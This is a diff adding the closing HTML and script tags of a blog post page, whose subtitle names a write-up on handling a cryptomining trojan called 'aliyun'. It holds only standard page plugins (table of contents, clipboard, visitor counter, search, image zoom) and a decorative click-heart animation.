+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "一个名叫aliyun的挖矿木马处理过程&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
